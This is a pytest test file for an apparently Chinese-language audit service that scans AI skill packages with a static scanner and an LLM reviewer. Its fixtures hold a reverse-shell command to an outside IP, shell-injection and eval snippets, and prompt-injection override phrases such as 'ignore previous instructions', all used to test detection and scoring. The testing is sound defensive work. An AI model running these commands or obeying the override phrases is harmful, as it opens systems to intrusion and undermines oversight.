import zipfile
from types import SimpleNamespace

import pytest

from core.config import settings
from services import (
    ai_policies_denoise,
    ai_policies_llm,
    ai_policies_report,
    ai_policies_scanner_client,
    ai_policies_service,
)
from tasks import ai_policies_tasks

CATEGORY_LABELS = {"AST02": "供应链投毒或依赖风险"}


def test_safe_error_message_hides_generic_exception_details() -> None:
    message = ai_policies_service._safe_error_message(
        RuntimeError("token=secret-value host=10.0.0.1")
    )

    assert message == "安全审查任务执行失败，请稍后重新发起审查"
    assert "secret-value" not in message
    assert "10.0.0.1" not in message


def test_safe_error_message_allows_scanner_safe_message() -> None:
    message = ai_policies_service._safe_error_message(
        ai_policies_scanner_client.AiPoliciesScannerError("安全审查引擎连接失败")
    )

    assert message == "安全审查引擎连接失败"


def test_zip_file_summaries_marks_file_status_without_double_count(tmp_path) -> None:
    zip_path = tmp_path / "skill.zip"
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr("SKILL.md", "# demo")
        zf.writestr("main.py", "print('ok')")
        zf.writestr("README.md", "docs")
    findings = [
        {
            "group_id": "AIPG-risk",
            "severity": "low",
            "counts_toward_score": True,
            "hit_count": 2,
            "locations": [
                {"file": "main.py", "start_line": 1},
                {"file": "main.py", "start_line": 2},
            ],
        }
    ]

    files = ai_policies_service._zip_file_summaries(str(zip_path), findings)
    by_path = {item["path"]: item for item in files}

    assert by_path["SKILL.md"]["status"] == "entry"
    assert by_path["main.py"]["status"] == "low"
    assert by_path["main.py"]["risk_count"] == 2
    assert by_path["README.md"]["status"] == "clean"


def test_zip_external_links_extracts_all_text_file_urls(tmp_path) -> None:
    zip_path = tmp_path / "skill.zip"
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr(
            "README.md",
            "\n".join(
                [
                    "https://example.com/one",
                    "https://example.com/two.",
                    "https://example.com/one",
                    "[Author](https://img.example.com/author-陈石(CS)-orange.svg)",
                    "[Email](mailto:test@example.com)",
                    "**作者**: [CSlawyer1985](https://github.com/CSlawyer1985)**",
                ]
            ),
        )
        zf.writestr("assets/template.html", '<img src="https://cdn.example.com/a.png">')

    links = ai_policies_service._zip_external_links(str(zip_path))
    urls = [item["url"] for item in links]

    assert urls == [
        "https://example.com/one",
        "https://example.com/two",
        "https://img.example.com/author-陈石(CS)-orange.svg",
        "mailto:test@example.com",
        "https://github.com/CSlawyer1985",
        "https://cdn.example.com/a.png",
    ]
    assert links[0]["file"] == "README.md"


def test_build_markdown_contains_four_sections_and_owasp_notice() -> None:
    audit = SimpleNamespace(
        audit_id="AIP-test",
        skill_name="demo-skill",
        skill_version="1.0.0",
        status="completed",
        decision="attention_required",
        severity="low",
        risk_score=7,
        source_sha256="abc",
        scanner="skillspector",
        scanner_version="2.3.9",
        findings_count=2,
        high_risk_count=0,
        must_review_count=0,
        llm_review_used=False,
        llm_review_model="",
        summary={
            "file_count": 2,
            "source_size_bytes": 2048,
            "files": [
                {
                    "path": "SKILL.md",
                    "role_label": "入口",
                    "severity": "low",
                    "size": 512,
                },
                {
                    "path": "README.md",
                    "role_label": "文档",
                    "severity": "none",
                    "size": 256,
                },
            ],
        },
        findings=[
            {
                "title": "未固定 npx 包版本，存在供应链替换风险",
                "severity": "low",
                "category": "AST02",
                "hit_count": 2,
                "locations": [
                    {
                        "file": "SKILL.md",
                        "start_line": 23,
                        "snippet": "23 | npx skills",
                    },
                    {
                        "file": "SKILL.md",
                        "start_line": 24,
                        "snippet": "24 | npx tools",
                    },
                ],
                "description": "检测到 npx 调用未固定明确版本。",
                "recommendation": "固定到明确版本。",
            }
        ],
    )

    markdown = ai_policies_report.build_markdown(audit, CATEGORY_LABELS)

    assert "## 1. 概览" in markdown
    assert "## 2. 审查结论" in markdown
    assert "## 3. 详细结果" in markdown
    assert "## 4. 声明" in markdown
    assert "## 5." not in markdown
    assert "## 8." not in markdown
    assert "OWASP Agentic Skills Top 10" in markdown
    assert "### 供应链投毒或依赖风险" in markdown
    assert "AST02 供应链投毒或依赖风险" not in markdown
    assert "发现：2 处" in markdown
    assert "23 | npx skills" in markdown
    assert "Skill 包文件" in markdown
    assert "SKILL.md：入口 / 低危" in markdown


def test_running_progress_uses_saved_progress() -> None:
    audit = SimpleNamespace(
        status="running",
        summary={
            "progress": {
                "value": 75,
                "completed": 3,
                "total": 4,
                "step": "正在进行 AI 深度审查",
            }
        },
    )

    assert ai_policies_report.progress_for(audit) == {
        "value": 75,
        "completed": 3,
        "total": 4,
        "step": "正在进行 AI 深度审查",
    }


def test_llm_category_reviews_marks_uncovered_categories_without_fake_result() -> None:
    reviews = ai_policies_llm.llm_category_reviews(
        {"category_reviews": []},
        [{"category": "AST02"}, {"category": "AST02"}],
        CATEGORY_LABELS,
    )

    assert reviews == [
        {
            "code": "AST02",
            "name": "供应链投毒或依赖风险",
            "result": "LLM 未单独研判",
            "reason": "",
            "recommendation": "",
        }
    ]


def test_llm_policy_safe_text_avoids_publish_blocking_language() -> None:
    text = ai_policies_llm._policy_safe_text(
        "该技能风险极高，建议拒绝发布；系统不应自动阻断发布；应立即拒绝并隔离。",
        200,
    )

    assert "拒绝发布" not in text
    assert "阻断发布" not in text
    assert "应立即拒绝" not in text
    assert "暂缓发布" in text


@pytest.mark.asyncio
async def test_run_llm_review_uses_platform_model_and_returns_category_reviews(
    monkeypatch,
    tmp_path,
) -> None:
    captured_kwargs = {}
    captured_messages = []
    call_count = 0

    async def fake_find_by_id(session, model_id):
        credential = SimpleNamespace(
            is_active=True,
            credential_info={"format": "openai"},
        )
        deployment = SimpleNamespace(is_active=True, credential=credential)
        return SimpleNamespace(
            id=model_id,
            model_id="qwen-audit",
            name="Qwen",
            is_active=True,
            category="chat",
            deployments=[deployment],
        )

    async def fake_chat_completion(model, messages, **kwargs):
        nonlocal call_count
        call_count += 1
        captured_kwargs.update(kwargs)
        captured_messages.append(messages)
        if call_count == 1:
            return {
                "choices": [
                    {
                        "message": {
                            "content": (
                                '{"selected_files":[{"path":"SKILL.md",'
                                '"reason":"入口说明"}],'
                                '"declared_intent":"演示 Skill"}'
                            )
                        }
                    }
                ]
            }
        return {
            "choices": [
                {
                    "message": {
                        "content": (
                            '{"overall_judgement":"建议复核供应链风险",'
                            '"reason":"存在未固定版本",'
                            '"finding_reviews":[{"group_id":"AIPG-test",'
                            '"finding_type":"true_risk",'
                            '"effective_severity":"low",'
                            '"counts_toward_score":true,'
                            '"confidence":"high",'
                            '"reason":"npx 未固定版本",'
                            '"recommendation":"固定版本"}],'
                            '"category_reviews":[{"code":"AST02",'
                            '"result":"需处理","reason":"npx 未固定版本",'
                            '"recommendation":"固定版本"}],'
                            '"intent_analysis":{"declared_intent":"演示 Skill",'
                            '"actual_behavior":"读取配置并安装依赖",'
                            '"consistency":"基本一致",'
                            '"basis":"主要风险来自依赖版本未固定"}}'
                        )
                    }
                }
            ]
        }

    async def fake_find_user_by_id(session, user_id):
        return SimpleNamespace(
            id=user_id,
            username="testadmin",
            is_active=True,
            litellm_user_id=f"aihelms_user_{user_id}",
        )

    async def fake_find_personal_main(session, user_id):
        return SimpleNamespace(
            id=47,
            is_active=True,
            litellm_key_id="sk-user-main",
            litellm_key_alias="user:testadmin/main",
            models=["qwen-audit"],
        )

    monkeypatch.setattr(ai_policies_llm.model_repo, "find_by_id", fake_find_by_id)
    monkeypatch.setattr(
        ai_policies_llm.user_repo, "find_user_by_id", fake_find_user_by_id
    )
    monkeypatch.setattr(
        ai_policies_llm.ai_key_repo,
        "find_personal_main",
        fake_find_personal_main,
    )
    monkeypatch.setattr(
        ai_policies_llm.litellm_client,
        "chat_completion",
        fake_chat_completion,
    )
    audit = SimpleNamespace(
        audit_id="AIP-test",
        skill_name="demo-skill",
        skill_version="1.0.0",
        risk_score=7,
        severity="low",
        skill_id=18,
        created_by=48,
    )
    zip_path = tmp_path / "skill.zip"
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr("SKILL.md", "# demo\n用于演示依赖安装。")
        zf.writestr("requirements.txt", "demo>=1.0")

    result = await ai_policies_llm.run_llm_review(
        None,
        9,
        audit,
        [
            {
                "group_id": "AIPG-test",
                "category": "AST02",
                "title": "未固定 npx 包版本",
            }
        ],
        CATEGORY_LABELS,
        str(zip_path),
    )

    assert result["status"] == "completed"
    assert result["model"] == "Qwen"
    assert call_count == 3
    assert "用于演示依赖安装" in captured_messages[1][1]["content"]
    assert "用于演示依赖安装" in captured_messages[2][1]["content"]
    assert result["finding_reviews"][0]["group_id"] == "AIPG-test"
    assert result["finding_reviews"][0]["effective_severity"] == "low"
    assert result["category_reviews"] == []
    assert result["intent_analysis"]["consistency"] == "基本一致"
    assert result["selected_files"] == ["SKILL.md"]
    assert captured_kwargs["api_key"] == "sk-user-main"
    assert captured_kwargs["user"] == "aihelms_user_48"
    assert captured_kwargs["metadata"]["aihelms_user_id"] == 48
    assert captured_kwargs["metadata"]["aihelms_ai_key_id"] == 47


@pytest.mark.asyncio
async def test_run_llm_review_generates_intent_analysis_without_findings(
    monkeypatch,
    tmp_path,
) -> None:
    call_count = 0

    async def fake_find_by_id(session, model_id):
        credential = SimpleNamespace(
            is_active=True,
            credential_info={"format": "openai"},
        )
        deployment = SimpleNamespace(is_active=True, credential=credential)
        return SimpleNamespace(
            id=model_id,
            model_id="qwen-audit",
            name="Qwen",
            is_active=True,
            category="chat",
            deployments=[deployment],
        )

    async def fake_find_user_by_id(session, user_id):
        return SimpleNamespace(
            id=user_id,
            username="testadmin",
            is_active=True,
            litellm_user_id=f"aihelms_user_{user_id}",
        )

    async def fake_find_personal_main(session, user_id):
        return SimpleNamespace(
            id=47,
            is_active=True,
            litellm_key_id="sk-user-main",
            litellm_key_alias="user:testadmin/main",
            models=["qwen-audit"],
        )

    async def fake_chat_completion(model, messages, **kwargs):
        nonlocal call_count
        call_count += 1
        if call_count == 1:
            return {
                "choices": [
                    {
                        "message": {
                            "content": (
                                '{"selected_files":[{"path":"SKILL.md",'
                                '"reason":"入口说明"}]}'
                            )
                        }
                    }
                ]
            }
        return {
            "choices": [
                {
                    "message": {
                        "content": (
                            '{"overall_judgement":"未发现明显风险",'
                            '"reason":"声明和文件内容一致",'
                            '"finding_reviews":[],'
                            '"category_reviews":[],'
                            '"intent_analysis":{"declared_intent":"生成文档",'
                            '"actual_behavior":"读取输入并生成 Markdown",'
                            '"consistency":"高度一致",'
                            '"basis":"入口说明和脚本行为一致"}}'
                        )
                    }
                }
            ]
        }

    monkeypatch.setattr(ai_policies_llm.model_repo, "find_by_id", fake_find_by_id)
    monkeypatch.setattr(
        ai_policies_llm.user_repo, "find_user_by_id", fake_find_user_by_id
    )
    monkeypatch.setattr(
        ai_policies_llm.ai_key_repo,
        "find_personal_main",
        fake_find_personal_main,
    )
    monkeypatch.setattr(
        ai_policies_llm.litellm_client,
        "chat_completion",
        fake_chat_completion,
    )
    audit = SimpleNamespace(
        audit_id="AIP-clean",
        skill_name="clean-skill",
        skill_version="1.0.0",
        risk_score=0,
        severity="low",
        skill_id=19,
        created_by=48,
    )
    zip_path = tmp_path / "clean.zip"
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr("SKILL.md", "# clean\n生成文档。")

    result = await ai_policies_llm.run_llm_review(
        None,
        9,
        audit,
        [],
        CATEGORY_LABELS,
        str(zip_path),
    )

    assert call_count == 2
    assert result["status"] == "completed"
    assert result["finding_reviews"] == []
    assert result["intent_analysis"]["consistency"] == "高度一致"
    assert result["selected_files"] == ["SKILL.md"]


@pytest.mark.asyncio
async def test_run_llm_review_does_not_fake_category_reviews_when_unparsed(
    monkeypatch,
) -> None:
    async def fake_find_by_id(session, model_id):
        credential = SimpleNamespace(
            is_active=True,
            credential_info={"format": "openai"},
        )
        deployment = SimpleNamespace(is_active=True, credential=credential)
        return SimpleNamespace(
            id=model_id,
            model_id="qwen-audit",
            name="Qwen",
            is_active=True,
            category="chat",
            deployments=[deployment],
        )

    async def fake_chat_completion(model, messages, **kwargs):
        return {"choices": [{"message": {"content": "无法给出 JSON"}}]}

    async def fake_find_user_by_id(session, user_id):
        return SimpleNamespace(
            id=user_id,
            username="testadmin",
            is_active=True,
            litellm_user_id=f"aihelms_user_{user_id}",
        )

    async def fake_find_personal_main(session, user_id):
        return SimpleNamespace(
            id=47,
            is_active=True,
            litellm_key_id="sk-user-main",
            litellm_key_alias="user:testadmin/main",
            models=["qwen-audit"],
        )

    monkeypatch.setattr(ai_policies_llm.model_repo, "find_by_id", fake_find_by_id)
    monkeypatch.setattr(
        ai_policies_llm.user_repo, "find_user_by_id", fake_find_user_by_id
    )
    monkeypatch.setattr(
        ai_policies_llm.ai_key_repo,
        "find_personal_main",
        fake_find_personal_main,
    )
    monkeypatch.setattr(
        ai_policies_llm.litellm_client,
        "chat_completion",
        fake_chat_completion,
    )

    result = await ai_policies_llm.run_llm_review(
        None,
        9,
        SimpleNamespace(
            audit_id="AIP-test",
            skill_name="demo-skill",
            skill_version="1.0.0",
            risk_score=70,
            severity="high",
            skill_id=18,
            created_by=48,
        ),
        [{"group_id": "AIPG-test", "category": "AST02", "title": "未固定 npx 包版本"}],
        CATEGORY_LABELS,
    )

    assert result["status"] == "unparsed"
    assert result["finding_reviews"] == []
    assert result["category_reviews"] == []
    assert "需复核" not in str(result)


def test_llm_response_content_accepts_common_openai_shapes() -> None:
    assert ai_policies_llm._response_content(
        {"choices": [{"message": {"content": '{"ok":true}'}}]}
    ) == '{"ok":true}'
    assert ai_policies_llm._response_content(
        {
            "choices": [
                {
                    "message": {
                        "content": [
                            {"type": "text", "text": '{"ok":'},
                            {"type": "text", "text": "true}"},
                        ]
                    }
                }
            ]
        }
    ) == '{"ok":true}'
    assert ai_policies_llm._response_content(
        {"choices": [{"text": '{"ok":true}'}]}
    ) == '{"ok":true}'
    assert ai_policies_llm._response_content(
        {"output_text": '{"ok":true}'}
    ) == '{"ok":true}'


def test_llm_review_normalizes_common_enum_values() -> None:
    reviews = ai_policies_llm.llm_finding_reviews(
        {
            "finding_reviews": [
                {
                    "groupId": "AIPG-test",
                    "findingType": "建议处理",
                    "effectiveSeverity": "高危",
                    "confidence": "高",
                    "counts_toward_score": True,
                    "reason": "存在风险",
                    "recommendation": "固定版本",
                }
            ]
        },
        [{"group_id": "AIPG-test"}],
    )

    assert reviews[0]["finding_type"] == "true_risk"
    assert reviews[0]["effective_severity"] == "high"
    assert reviews[0]["confidence"] == "high"


@pytest.mark.asyncio
async def test_run_llm_review_skips_without_current_admin_ai_identity(
    monkeypatch,
) -> None:
    async def fake_find_by_id(session, model_id):
        credential = SimpleNamespace(
            is_active=True,
            credential_info={"format": "openai"},
        )
        deployment = SimpleNamespace(is_active=True, credential=credential)
        return SimpleNamespace(
            id=model_id,
            model_id="qwen-audit",
            name="Qwen",
            is_active=True,
            category="chat",
            deployments=[deployment],
        )

    async def fake_find_user_by_id(session, user_id):
        return SimpleNamespace(
            id=user_id,
            username="testadmin",
            is_active=True,
            litellm_user_id=f"aihelms_user_{user_id}",
        )

    async def fake_find_personal_main(session, user_id):
        return None

    async def fake_chat_completion(model, messages, **kwargs):
        raise AssertionError("LLM 调用不应在缺少管理员 AI 身份时发生")

    monkeypatch.setattr(ai_policies_llm.model_repo, "find_by_id", fake_find_by_id)
    monkeypatch.setattr(
        ai_policies_llm.user_repo, "find_user_by_id", fake_find_user_by_id
    )
    monkeypatch.setattr(
        ai_policies_llm.ai_key_repo,
        "find_personal_main",
        fake_find_personal_main,
    )
    monkeypatch.setattr(
        ai_policies_llm.litellm_client,
        "chat_completion",
        fake_chat_completion,
    )

    result = await ai_policies_llm.run_llm_review(
        None,
        9,
        SimpleNamespace(
            audit_id="AIP-test",
            skill_name="demo-skill",
            skill_version="1.0.0",
            risk_score=70,
            severity="high",
            skill_id=18,
            created_by=48,
        ),
        [{"group_id": "AIPG-test", "category": "AST02", "title": "未固定 npx 包版本"}],
        CATEGORY_LABELS,
    )

    assert result == {
        "status": "skipped",
        "message": "发起审查的管理员未配置可用的个人主 Key",
    }


def test_aggregate_findings_groups_locations_and_keeps_hit_count() -> None:
    normalized = [
        {
            "source": "static",
            "rule_id": "RP1",
            "category": "AST02",
            "raw_category": "MCP Rug Pull",
            "severity": "high",
            "scanner_severity": "high",
            "effective_severity": "low",
            "confidence": 90,
            "title": "未固定 npx 包版本",
            "description": "依赖未固定版本。",
            "recommendation": "固定到明确版本。",
            "file_role": "runtime_entry",
            "path_bucket": "skill.md",
            "finding_type": "true_risk",
            "counts_toward_score": True,
            "location": {"file": "SKILL.md", "start_line": 10, "end_line": 10},
            "evidence": {"snippet": "10 | npx demo"},
            "must_review": True,
        },
        {
            "source": "static",
            "rule_id": "RP1",
            "category": "AST02",
            "raw_category": "MCP Rug Pull",
            "severity": "critical",
            "scanner_severity": "critical",
            "effective_severity": "low",
            "confidence": 80,
            "title": "未固定 npx 包版本",
            "description": "依赖未固定版本。",
            "recommendation": "固定到明确版本。",
            "file_role": "runtime_entry",
            "path_bucket": "skill.md",
            "finding_type": "true_risk",
            "counts_toward_score": True,
            "location": {"file": "SKILL.md", "start_line": 12, "end_line": 12},
            "evidence": {"snippet": "12 | npx demo"},
            "must_review": True,
        },
    ]

    groups = ai_policies_service._aggregate_findings(normalized)

    assert len(groups) == 1
    assert groups[0]["hit_count"] == 2
    assert groups[0]["severity"] == "critical"
    assert groups[0]["group_id"].startswith("AIPG-")
    assert groups[0]["locations"][1]["start_line"] == 12


def test_display_findings_localizes_legacy_grouped_english_text() -> None:
    findings = [
        {
            "rule_id": "LP3",
            "category": "AST03",
            "raw_category": "MCP Least Privilege",
            "severity": "medium",
            "title": "MCP Least Privilege",
            "description": "Without declared permissions the skill's intent is opaque.",
            "recommendation": "Add a permissions field.",
            "hit_count": 1,
            "locations": [{"file": "SKILL.md", "start_line": 1}],
        },
        {
            "rule_id": "MP1",
            "category": "AST08",
            "raw_category": "Memory Poisoning",
            "severity": "medium",
            "title": "Memory Poisoning - Context Window Stuffing",
            "description": "Skill attempts to fill the context window.",
            "recommendation": "Implement context-window management.",
            "hit_count": 2,
            "locations": [{"file": "run.py", "start_line": 9}],
        },
    ]

    localized = ai_policies_service._display_findings(findings)
    titles = {item["title"] for item in localized}

    assert titles == {"权限声明不完整", "上下文填充风险"}
    assert "Without declared permissions" not in str(localized)
    assert "Context Window Stuffing" not in str(localized)


def test_display_findings_denoises_legacy_template_prompt_injection_group() -> None:
    findings = [
        {
            "rule_id": "P2",
            "category": "AST05",
            "raw_category": "Prompt Injection",
            "severity": "high",
            "title": "存在提示注入相关风险",
            "description": "检测到可能影响系统指令边界的提示内容。",
            "recommendation": "明确区分系统指令、用户输入和外部内容。",
            "hit_count": 2,
            "locations": [
                {
                    "file": "legal-architecture/assets/template.html",
                    "start_line": 58,
                    "snippet": "<!-- Header -->",
                },
                {
                    "file": "legal-architecture/assets/template.html",
                    "start_line": 166,
                    "snippet": "[姓名]",
                },
            ],
        }
    ]

    display = ai_policies_service._display_findings(findings)

    assert len(display) == 1
    assert display[0]["file_role"] == "template_asset"
    assert display[0]["finding_type"] == "false_positive"
    assert display[0]["severity"] == "none"
    assert display[0]["counts_toward_score"] is False
    assert display[0]["hit_count"] == 2
    assert display[0]["locations"][0]["file"] == (
        "legal-architecture/assets/template.html"
    )
    metrics = ai_policies_service._display_metrics(
        SimpleNamespace(
            status="completed",
            decision="high_risk",
            severity="critical",
            risk_score=100,
            findings_count=2,
            high_risk_count=2,
            must_review_count=2,
        ),
        display,
    )
    assert metrics["risk_score"] == 0
    assert metrics["decision"] == "passed"
    assert metrics["severity"] == "low"
    assert metrics["findings_count"] == 0


def test_mixed_prompt_injection_keeps_runtime_risk_and_drops_template_noise() -> None:
    template = {
        "id": "PI1",
        "category": "Prompt Injection",
        "pattern": "prompt injection",
        "severity": "HIGH",
        "location": {
            "file": "legal-architecture/assets/template.html",
            "start_line": 1,
        },
        "finding": "忽略之前的规则",
    }
    runtime = {
        "id": "YR4",
        "category": "Prompt Injection",
        "pattern": "prompt injection",
        "severity": "HIGH",
        "location": {"file": "SKILL.md", "start_line": 8},
        "finding": "运行时要求模型忽略平台规则并泄露上下文",
    }

    groups = ai_policies_service._aggregate_findings(
        [
            ai_policies_service._normalize_finding(template),
            ai_policies_service._normalize_finding(runtime),
        ]
    )
    score = ai_policies_denoise.score_groups(groups)
    template_group = next(
        item for item in groups if item["file_role"] == "template_asset"
    )
    runtime_group = next(
        item for item in groups if item["file_role"] == "runtime_entry"
    )

    assert template_group["finding_type"] == "false_positive"
    assert template_group["counts_toward_score"] is False
    assert runtime_group["finding_type"] == "true_risk"
    assert runtime_group["counts_toward_score"] is True
    assert runtime_group["severity"] == "high"
    assert score.decision == "high_risk"


def test_finding_text_replaces_unknown_english_problem_and_recommendation() -> None:
    title, description, recommendation = ai_policies_service._finding_text(
        {
            "id": "NEW1",
            "category": "Output Handling",
            "pattern": "Unvalidated output reaches downstream shell context",
            "explanation": (
                "Model output is used without validation or sanitization before "
                "being passed to downstream systems."
            ),
            "remediation": (
                "Validate and sanitize all model output before using it in "
                "downstream contexts."
            ),
        },
        "AST08",
    )

    combined = f"{title}\n{description}\n{recommendation}"

    assert "Model output" not in combined
    assert "Validate and sanitize" not in combined
    assert title
    assert description
    assert recommendation
    assert any("\u4e00" <= char <= "\u9fff" for char in combined)


def test_file_role_and_scanner_diagnostic_are_denoised() -> None:
    diagnostic = {
        "id": "SC4",
        "category": "Supply Chain",
        "finding": "OSV.dev unreachable, using static fallback",
        "location": {"file": "requirements.txt"},
    }
    template = {
        "id": "PI1",
        "category": "Prompt Injection",
        "pattern": "ignore previous instructions",
        "severity": "HIGH",
        "location": {"file": "legal-architecture/assets/template.html"},
    }

    normalized = [
        ai_policies_service._normalize_finding(diagnostic),
        ai_policies_service._normalize_finding(template),
    ]
    groups = ai_policies_service._aggregate_findings(normalized)
    score = ai_policies_denoise.score_groups(groups)

    assert normalized[0]["file_role"] == "scanner_diagnostic"
    assert (
        ai_policies_service._scan_limitations(normalized)[0]["title"]
        == "依赖漏洞库查询未完成"
    )
    assert len(groups) == 1
    assert groups[0]["file_role"] == "template_asset"
    assert groups[0]["finding_type"] == "false_positive"
    assert groups[0]["counts_toward_score"] is False
    assert score.risk_score == 0
    assert score.decision == "passed"


def test_normal_skill_noise_does_not_become_severe_without_llm() -> None:
    raw_findings = [
        {
            "id": "PI1",
            "category": "Prompt Injection",
            "pattern": "ignore previous instructions",
            "severity": "HIGH",
            "location": {"file": "README.md", "start_line": 8},
        },
        {
            "id": "AST4",
            "category": "Dangerous Code",
            "pattern": "subprocess.run",
            "severity": "HIGH",
            "location": {"file": "contract-review/scripts/mermaid_renderer.py"},
            "code_snippet": 'subprocess.run(["pandoc", input_file], check=True)',
        },
        {
            "id": "SC1",
            "category": "Supply Chain",
            "pattern": "unpinned dependency",
            "severity": "HIGH",
            "location": {"file": "requirements.txt"},
        },
    ]

    normalized = [ai_policies_service._normalize_finding(item) for item in raw_findings]
    groups = ai_policies_service._aggregate_findings(normalized)
    score = ai_policies_denoise.score_groups(groups)

    fixed_tool_group = next(group for group in groups if group["category"] == "AST06")

    assert fixed_tool_group["finding_type"] == "false_positive"
    assert fixed_tool_group["severity"] == "none"
    assert fixed_tool_group["counts_toward_score"] is False
    assert score.risk_score < 70
    assert score.decision == "attention_required"
    assert score.severity == "low"


def test_nested_markdown_prompt_injection_is_documentation_noise() -> None:
    raw = {
        "id": "P2",
        "category": "Prompt Injection",
        "pattern": "Hidden Instructions",
        "severity": "HIGH",
        "location": {
            "file": (
                "legal-job-search/extensions/interactive-resume/"
                "dify-integration.md"
            ),
            "start_line": 224,
        },
        "code_snippet": "作品助手，可以帮你了解{姓名}的文章、研究和项目。",
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]
    score = ai_policies_denoise.score_groups([group])

    assert group["file_role"] == "documentation"
    assert group["finding_type"] == "false_positive"
    assert group["severity"] == "none"
    assert group["counts_toward_score"] is False
    assert score.risk_score == 0


def test_fixed_tool_output_handling_is_review_note() -> None:
    raw = {
        "id": "OH1",
        "category": "Output Handling",
        "pattern": "Unvalidated Output Injection",
        "severity": "HIGH",
        "location": {"file": "law-to-markdown/scripts/law_to_markdown.py"},
        "code_snippet": (
            'cmd = ["/usr/bin/osascript", "-l", "JavaScript", str(script)]\n'
            "proc = subprocess.run(cmd, capture_output=True, text=True)"
        ),
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]
    score = ai_policies_denoise.score_groups([group])

    assert group["category"] == "AST08"
    assert group["finding_type"] == "false_positive"
    assert group["severity"] == "none"
    assert group["counts_toward_score"] is False
    assert score.risk_score == 0


def test_fixed_tool_command_context_extracts_list_args() -> None:
    raw = {
        "id": "AST4",
        "category": "Dangerous Code",
        "pattern": "subprocess.run",
        "severity": "HIGH",
        "location": {"file": "contract-review/scripts/render.py"},
        "code_snippet": (
            "cmd = ['/usr/bin/pandoc', input_file, '-o', output_file]\n"
            "subprocess.run(cmd, check=True)"
        ),
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]

    assert group["command_context"]["list_args"] is True
    assert group["command_context"]["fixed_tool"] is True
    assert group["command_context"]["shell_true"] is False
    assert group["finding_type"] == "false_positive"
    assert group["severity"] == "none"
    assert group["counts_toward_score"] is False


def test_shell_true_external_command_remains_high_risk() -> None:
    raw = {
        "id": "AST4",
        "category": "Dangerous Code",
        "pattern": "subprocess shell",
        "severity": "HIGH",
        "location": {"file": "runner.py"},
        "code_snippet": (
            "cmd = 'pandoc ' + request.args['file']\n"
            "subprocess.run(cmd, shell=True)"
        ),
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]
    score = ai_policies_denoise.score_groups([group])

    assert group["command_context"]["shell_true"] is True
    assert group["finding_type"] == "true_risk"
    assert group["severity"] == "high"
    assert group["counts_toward_score"] is True
    assert score.decision == "high_risk"


def test_external_eval_is_redline() -> None:
    raw = {
        "id": "AST4",
        "category": "Dangerous Code",
        "pattern": "eval",
        "severity": "HIGH",
        "location": {"file": "runner.py"},
        "code_snippet": "result = eval(request.args['expr'])",
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]

    assert group["command_context"]["dangerous_exec"] is True
    assert group["redline"] is True
    assert group["finding_type"] == "true_risk"
    assert group["severity"] == "high"
    assert group["counts_toward_score"] is True


def test_install_hint_sudo_is_review_note() -> None:
    raw = {
        "id": "PE2",
        "category": "Privilege",
        "pattern": "sudo apt-get install pandoc",
        "severity": "MEDIUM",
        "location": {"file": "contract-review/scripts/contract_analyzer.py"},
        "code_snippet": (
            'print("未找到pandoc命令,请先安装: sudo apt-get install pandoc")'
        ),
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]
    score = ai_policies_denoise.score_groups([group])

    assert group["category"] == "AST03"
    assert group["finding_type"] == "review_note"
    assert group["severity"] == "info"
    assert group["counts_toward_score"] is False
    assert score.risk_score == 0


def test_empty_least_privilege_signal_is_review_note() -> None:
    raw = {
        "id": "LP3",
        "category": "MCP Least Privilege",
        "severity": "MEDIUM",
        "location": {"file": "SKILL.md", "start_line": 1},
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]
    score = ai_policies_denoise.score_groups([group])

    assert group["finding_type"] == "review_note"
    assert group["counts_toward_score"] is False
    assert group["severity"] == "info"
    assert score.risk_score == 0


def test_known_vulnerable_dependency_is_not_downgraded_to_unpinned_low() -> None:
    raw = {
        "id": "SC4",
        "category": "Supply Chain",
        "pattern": "Known Vulnerable Dependency: requests==2.0",
        "severity": "HIGH",
        "location": {"file": "requirements.txt", "start_line": 1},
        "finding": "requests==2.0",
    }

    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]
    score = ai_policies_denoise.score_groups([group])

    assert group["finding_type"] == "true_risk"
    assert group["severity"] == "high"
    assert group["counts_toward_score"] is True
    assert score.decision == "high_risk"


def test_llm_review_completed_accepts_intent_analysis_only() -> None:
    assert ai_policies_service._llm_review_completed(
        {
            "status": "completed",
            "finding_reviews": [],
            "intent_analysis": {
                "declared_intent": "生成文档",
                "actual_behavior": "读取输入并生成 Markdown",
                "consistency": "高度一致",
                "basis": "入口说明和脚本行为一致",
            },
        }
    ) is True


def test_redline_finding_cannot_be_downgraded_by_llm() -> None:
    raw = {
        "id": "YR1",
        "category": "Dangerous Code reverse_shell",
        "pattern": "reverse_shell",
        "severity": "CRITICAL",
        "location": {"file": "run.py"},
        "code_snippet": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
    }
    group = ai_policies_service._aggregate_findings(
        [ai_policies_service._normalize_finding(raw)]
    )[0]
    reviewed = ai_policies_denoise.apply_finding_reviews(
        [group],
        {
            "status": "completed",
            "finding_reviews": [
                {
                    "group_id": group["group_id"],
                    "finding_type": "false_positive",
                    "effective_severity": "none",
                    "counts_toward_score": False,
                }
            ],
        },
    )

    score = ai_policies_denoise.score_groups(reviewed)

    assert reviewed[0]["redline"] is True
    assert reviewed[0]["counts_toward_score"] is True
    assert score.decision == "high_risk"


@pytest.mark.asyncio
async def test_process_skill_audit_marks_failed_with_safe_error(monkeypatch) -> None:
    audit = SimpleNamespace(
        id=1,
        audit_id="AIP-fail",
        audit_type="skill",
        skill_id=7,
        skill_name="demo-skill",
        skill_version="1.0.0",
        source_sha256="abc",
        scanner="",
        scanner_version="",
        status="queued",
        decision="",
        severity="",
        risk_score=0,
        findings_count=0,
        high_risk_count=0,
        must_review_count=0,
        llm_review_used=False,
        llm_review_model="",
        error_message="",
        started_at=None,
